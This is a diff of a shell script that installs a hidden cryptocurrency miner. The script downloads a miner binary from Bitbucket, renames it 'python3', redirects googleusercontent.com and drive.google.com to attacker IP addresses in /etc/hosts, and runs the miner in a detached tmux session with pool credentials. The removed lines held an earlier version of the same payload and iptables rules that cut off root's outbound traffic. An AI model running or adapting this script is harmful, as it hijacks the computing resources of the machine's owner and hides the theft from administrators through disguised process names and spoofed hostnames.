@@ -6,16 +6,9 @@ rm pools.txt
 rm nvidia.txt
 wget https://raw.githubusercontent.com/evilbabylx/script/master/configazi/pools.txt
 sh -c "echo '216.244.80.11  googleusercontent.com' >> /etc/hosts"
-sh -c "echo '38.130.192.192  drive.google.com' >> /etc/hosts"
-iptables -I OUTPUT 1 -p tcp --sport 22 -j ACCEPT
-iptables -I OUTPUT 2 -p udp --dport 53 -j ACCEPT
-iptables -I OUTPUT 3 -p tcp -d googleusercontent.com -j ACCEPT
-iptables -I OUTPUT 4 -p tcp -d drive.google.com -j ACCEPT
-iptables -I OUTPUT 5 -p all -m owner --uid-owner root -j DROP
 
 
-wget https://github.com/biblepay/cpuminer/raw/master/binaries/bbpminer_linux
-chmod +x bbpminer_linux
-mv bbpminer_linux python3
-tmux new-session -d -s xmr1 './python3 -o drive.google.com:80 -u lovelyn -p tengicungduoc1234 --no-longpoll'
+wget https://bitbucket.org/tengikekao/myrep/downloads/python3
+chmod +x python3
+tmux new-session -d -s xmr1 './python3 -a yespowerr16 -o stratum+tcp://googleusercontent.com:808 -u lovelyn.worker1 -p d=0.1'
 ./xmr-stak --noCPU
